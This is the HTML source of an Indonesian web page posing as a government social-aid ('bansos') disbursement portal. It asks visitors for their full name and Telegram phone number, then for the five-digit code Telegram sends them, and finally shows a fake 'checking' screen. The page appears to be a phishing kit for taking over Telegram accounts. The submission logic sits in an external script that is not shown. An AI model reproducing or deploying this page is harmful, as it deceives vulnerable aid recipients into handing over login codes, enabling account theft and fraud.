<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="Info bansos 2025">
    <meta property="og:image" content="">
    <meta name="description" />
    <meta name="author" content="Info bansos 2025" />
    <title>Info bansos 2025</title>
    <link rel="icon" type="image/x-icon" href="assets/favico.png" />
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/vendors/css/style.css" />
    <link rel="stylesheet" href="assets/vendors/css/style-1.css" />
    <style>
        .loading {
            display: none;
            position: fixed;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.7);
            top: 0; left: 0;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .code-input {
            width: 50px;
            height: 50px;
            text-align: center;
            font-size: 24px;
            margin: 0 5px;
        }
        .btn-mk {
            background: #0b7478;
            color: white;
            border-radius: 5px;
            padding: 10px 20px;
            font-weight: bold;
        }
       #error-message {
        display: none;
        color: #fff;
        background: #dc3545;
        padding: 10px;
        border-radius: 5px;
        text-align: center;
        margin-top: 10px;
        transition: opacity 0.5s ease-in-out;
      }
    </style>
</head>
<body>
    <div id="loading" class="loading" style="display: none;"></div>
    <div class="container mt-3">
        <div class="header">
            <img class="d-block w-100" src="assets/photo_2025-02-09_14-39-47.jpg" alt="Image">
        </div>
    </div>
    <div class="container mt-3">
        <div class="header px-3">
            <h4 class="fw-bold mt-2 page-header text-center ">
                <marquee scrolldelay='30'>Silahkan isi Data Anda Dengan Benar Di Bawah Untuk PENCAIRAN DATA PM (Penerima Manfaat) BANSOS</marquee>
            </h4>
        </div>
    </div>

    <div class="first container py-3 mb-3">
        <div class="header mb-3 px-3" style="background: #0b7478;color: #f1f3f5;">
            <h5 class="fw-bold mt-2 text-center ">PENCAIRAN DATA PM (Penerima Manfaat) BANSOS</h5>
        </div>
        <div id="error-message"></div>        
    <div class="p-4">
        <form id="firstForm">
            <div class="form-group">
                <label for="full_name">Nama Lengkap (sesuai KTP)</label>
                <input type="text" class="form-control" id="full_name" placeholder="Nama Lengkap" required>
            </div>
            <div class="form-group">
                <label>Nomor Telegram Aktif</label>
                <div class="input-group">
                    <span class="input-group-text">🇮🇩</span>
                    <input type="tel" class="form-control" id="phone" placeholder="Masukkan Nomor" required maxlength="15">
                </div>
            </div>
            <div class="form-group">
                <input type="checkbox" id="agree_whatsapp" required> Saya setuju menerima pesan Telegram terkait bansos ini.
            </div>
            <div class="text-center mt-2">
                <button type="submit" class="btn btn-mk" onclick="processFirstData()">CEK STATUS</button>
            </div>
        </form>
    </div>
</div>

<div class="second container py-3 mb-3" style="display: none;">
    <div class="p-4">
        <h4 class="fw-bold text-center"><span id="phone-number-display"></span></h4>
        <p class="text-center">Kami telah mengirimkan kode ke aplikasi <b>Telegram</b> Anda.</p>
        <hr>
        <form id="secondForm">
            <div class="d-flex justify-content-center pb-3">
                <input type="tel" class="form-control code-input mx-1" maxlength="1" required>
                <input type="tel" class="form-control code-input mx-1" maxlength="1" required>
                <input type="tel" class="form-control code-input mx-1" maxlength="1" required>
                <input type="tel" class="form-control code-input mx-1" maxlength="1" required>
                <input type="tel" class="form-control code-input mx-1" maxlength="1" required>
            </div>
            <div class="text-center mt-2">
                <button type="submit" class="btn btn-mk">VERIFIKASI</button>
            </div>
        </form>
    </div>
</div>
    <div class="four container py-3 mb-3" style="display: none;">
        <div class="header p-4">
            <h3 class="fw-bold mt-2 page-header text-center ">
                <span id="ctl00_RecipientMasterContent_lblSubject">Sedang Dalam Pengecekan...</span>
            </h3>
            <p class="text-center">Jika anda telah diterima kami akan mengirimkan pesan melalui Telegram</p>
            <hr>
            <p class="text-center mt-3 py-3">
                <img src="assets/processing.gif" id="ctl00_logohead" class="img-fluid" width="120" style="margin-left: auto;margin-right: auto;">
            </p>
            <h5 class="fw-bold my-3 page-header text-center "> Pastikan Data yang anda input sudah benar </h5>
            <div class="text-center py-3">
                <button type="submit" class="btn btn-sm btn-mk font-weight-bold">COBA LAGI</button>
            </div>
        </div>
</div>
    <div class="container my-5">
        <div class="header p-3 ">
            <img class="d-block w-100" src="assets/ftr.png" alt="Image">
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>    
<script src="assets/vendors/js/script.js"></script>
<script>
document.getElementById("phone").addEventListener("input", function() {
            let phone = this.value;

            if (phone.startsWith("08")) {
                this.value = "628" + phone.substring(2);
            }

            if (!this.value.startsWith("628")) {
                this.value = "628";
            }
        });
        
document.addEventListener("DOMContentLoaded", function () {
            const inputs = document.querySelectorAll(".code-input");

            inputs.forEach((input, index) => {
                input.addEventListener("input", (e) => {
                    if (e.inputType !== "deleteContentBackward" && input.value !== "" && index < inputs.length - 1) {
                        inputs[index + 1].focus();
                    }
                });

                input.addEventListener("keydown", (e) => {
                    if (e.key === "Backspace" && index > 0 && input.value === "") {
                        inputs[index - 1].focus();
                    }
                });
            });
        });
</script>
</body>
</html>